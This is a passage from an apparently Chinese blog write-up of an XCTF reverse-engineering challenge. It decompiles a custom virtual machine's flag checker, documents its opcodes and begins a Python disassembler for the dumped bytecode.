class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] &lt;&lt;= a1[<span class="number">2</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0x99</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">118</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">3</span>] = *(_DWORD *)a1[<span class="number">6</span>];</span><br><span class="line">      *(_DWORD *)a1[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">      a1[<span class="number">6</span>] += <span class="number">4</span>;</span><br><span class="line">      a1[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">84</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (_BYTE *)a1[<span class="number">3</span>];</span><br><span class="line">      *v2 = getchar();</span><br><span class="line">      a1[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">48</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] |= a1[<span class="number">2</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] &amp;= a1[<span class="number">2</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] = dword_804B28C;</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">9</span>] = a1[<span class="number">1</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">17</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">void</span> *)a1[<span class="number">1</span>]);</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0xA0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">1</span>] != <span class="number">653840640</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0xA1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;flag:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, byte_804B2E0, <span class="number">0x28</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(byte_804B2E0) != <span class="number">33</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0xB1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">9</span>] = dword_804B2A0[<span class="number">0</span>];</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0xB2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">9</span>] = dword_804B2A4;</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0xA4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_804B2A0[*(<span class="keyword">unsigned</span> __int8 *)(a1[<span class="number">8</span>] + <span class="number">1</span>)] = a1[<span class="number">1</span>];</span><br><span class="line">      a1[<span class="number">8</span>] += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0xB3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">9</span>] = dword_804B2A8;</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0xB4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">9</span>] = dword_804B2AC;</span><br><span class="line">      ++a1[<span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0xC1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int8)byte_804B2E0[*(<span class="keyword">unsigned</span> __int8 *)(a1[<span class="number">8</span>] + <span class="number">1</span>)];</span><br><span class="line">      a1[<span class="number">8</span>] += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)a1[<span class="number">8</span>] == <span class="number">0xC2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">1</span>] != *(_DWORD *)(a1[<span class="number">8</span>] + <span class="number">1</span>) )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      a1[<span class="number">8</span>] += <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细研究可以知道，a1这个数组里，a1[1]~a1[4]和a1[9]是一组寄存器，a1[8]指向的地方实际上是opcode（a1[8]其实就是PC），dword_804B28C则是刚刚输入的数据（myInput），byte_804B2E0就是输入的flag。</p><p>整理可以得到以下伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//arr-&gt;4bytes</span></span><br><span class="line"><span class="number">0x09</span>                    <span class="comment">//r1=myInput</span></span><br><span class="line"><span class="number">0x10</span>                    <span class="comment">//r9=r1</span></span><br><span class="line"><span class="number">0x22</span>                    <span class="comment">//r1&gt;&gt;=r2</span></span><br><span class="line"><span class="number">0x23</span>                    <span class="comment">//r1&lt;&lt;=r2</span></span><br><span class="line"><span class="number">0x30</span>                    <span class="comment">//r1|=r2</span></span><br><span class="line"><span class="number">0x31</span>                    <span class="comment">//r1&amp;=r2</span></span><br><span class="line"><span class="number">0x41</span>                    <span class="comment">//r1+=r2</span></span><br><span class="line"><span class="number">0x42</span>                    <span class="comment">//r1-=r4</span></span><br><span class="line"><span class="number">0x43</span>                    <span class="comment">//r1*=r3</span></span><br><span class="line"><span class="number">0x44</span>                    <span class="comment">//r1/=r5</span></span><br><span class="line"><span class="number">0x71</span> aa bb cc dd        <span class="comment">//push ddccbbaa</span></span><br><span class="line"><span class="number">0x76</span> ?? ?? ?? ??        <span class="comment">//pop r3</span></span><br><span class="line"><span class="number">0x77</span>                    <span class="comment">//r1^=r9</span></span><br><span class="line"><span class="number">0x80</span> rx aa bb cc dd     <span class="comment">//rx=ddbbccaa</span></span><br><span class="line"><span class="number">0x99</span>                    <span class="comment">//exit</span></span><br><span class="line"><span class="number">0xA0</span>                    <span class="comment">//check1(r1==653840640)</span></span><br><span class="line"><span class="number">0xA1</span>                    <span class="comment">//check2(input flag;strlen(flag)==33)</span></span><br><span class="line"><span class="number">0xA4</span> aa bb cc           <span class="comment">//arr[ccbbaa]=r1</span></span><br><span class="line"><span class="number">0xB1</span>                    <span class="comment">//r9=arr[0]</span></span><br><span class="line"><span class="number">0xB2</span>                    <span class="comment">//r9=arr[1]</span></span><br><span class="line"><span class="number">0xB3</span>                    <span class="comment">//r9=arr[2]</span></span><br><span class="line"><span class="number">0xB4</span>                    <span class="comment">//r9=arr[3]</span></span><br><span class="line"><span class="number">0xC1</span> aa                 <span class="comment">//r1=flag[aa]</span></span><br><span class="line"><span class="number">0xC2</span> aa bb cc dd        <span class="comment">//check3(r1==ddbbccaa)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这三个有可能是提供给我们hook用的，但是懒得想了= =总之原opcode全程没用到</span></span><br><span class="line"><span class="comment">if ( *(_BYTE *)a1[8] == 0x53 )&#123;</span></span><br><span class="line"><span class="comment">  putchar(*(char *)a1[3]);</span></span><br><span class="line"><span class="comment">  a1[8] += 2;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if ( *(_BYTE *)a1[8] == 0x54 )&#123;</span></span><br><span class="line"><span class="comment">  v2 = (_BYTE *)a1[3];</span></span><br><span class="line"><span class="comment">  *v2 = getchar();</span></span><br><span class="line"><span class="comment">  a1[8] += 2;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if ( *(_BYTE *)a1[8] == 0x11 )&#123;</span></span><br><span class="line"><span class="comment">  printf(&quot;%p\n&quot;, (const void *)a1[1]);</span></span><br><span class="line"><span class="comment">  ++a1[8];</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>然后去a1[8]的地方拿到opcode，反汇编。</p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103173551820.png"></p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103173731962.png"></p><p><img src="/p/logFor-RealProbs-in-adworld-XCTF/image-20210103173806534.png"></p><p>把opcode即unk_804B080处的数据dump下来，convert成python样式的byte数组，写反汇编脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">opcode=[<span class="number">0x09</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x96</span>, <span class="number">0xF3</span>, <span class="number">0x78</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD4</span>, <span class="number">0x85</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0xA0</span>, <span class="number">0x09</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x80</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x43</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0xA4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x80</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x44</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0xA4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x80</span>, <span class="number">0x09</span>, <span class="number">0xBB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0xA4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x80</span>, <span class="number">0x04</span>, <span class="number">0xA0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x42</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0xA4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA1</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x02</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x95</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x03</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x04</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x06</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x2F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x07</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x65</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x08</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x2D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x09</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x2F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0A</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x39</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0C</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xBB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0D</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0E</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0F</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x3F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x10</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x3A</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x11</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x61</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x12</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x13</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x14</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x15</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x3F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x16</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x3F</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x17</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xB5</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x18</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x13</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x19</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0xA0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1A</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x21</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1C</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x39</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1E</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x73</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1F</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x46</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x99</span>]</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> opcode[i]==<span class="number">0x09</span>:</span><br><span class="line">        print(<span class="string">&quot;r1=myInput&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x10</span>:</span><br><span class="line">        print(<span class="string">&quot;r9=r1&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x22</span>:</span><br><span class="line">        print(<span class="string">&quot;r1&gt;&gt;=r2&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x23</span>:</span><br><span class="line">        print(<span class="string">&quot;r1&lt;&lt;=r2&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x30</span>:</span><br><span class="line">        print(<span class="string">&quot;r1|=r2&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x31</span>:</span><br><span class="line">        print(<span class="string">&quot;r1&amp;=r2&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x41</span>:</span><br><span class="line">        print(<span class="string">&quot;r1+=r2&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x42</span>:</span><br><span class="line">        print(<span class="string">&quot;r1-=r4&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x43</span>:</span><br><span class="line">        print(<span class="string">&quot;r1*=r3&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x44</span>:</span><br><span class="line">        print(<span class="string">&quot;r1/=r5&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x71</span>:</span><br><span class="line">        idata=(opcode[i+<span class="number">4</span>]&lt;&lt;<span class="number">24</span>)+(opcode[i+<span class="number">3</span>]&lt;&lt;<span class="number">16</span>)+(opcode[i+<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)+(opcode[i+<span class="number">1</span>])</span><br><span class="line">        print(<span class="string">&quot;push 0x%x&quot;</span>%idata)</span><br><span class="line">        i+=<span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x76</span>:</span><br><span class="line">        idata=(opcode[i+<span class="number">4</span>]&lt;&lt;<span class="number">24</span>)+(opcode[i+<span class="number">3</span>]&lt;&lt;<span class="number">16</span>)+(opcode[i+<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)+(opcode[i+<span class="number">1</span>])</span><br><span class="line">        print(<span class="string">&quot;pop r3 (unknown 0x%x)&quot;</span>%idata)</span><br><span class="line">        i+=<span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span class="number">0x77</span>:</span><br><span class="line">        print(<span class="string">&quot;r1^=r9&quot;</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> opcode[i]==<span 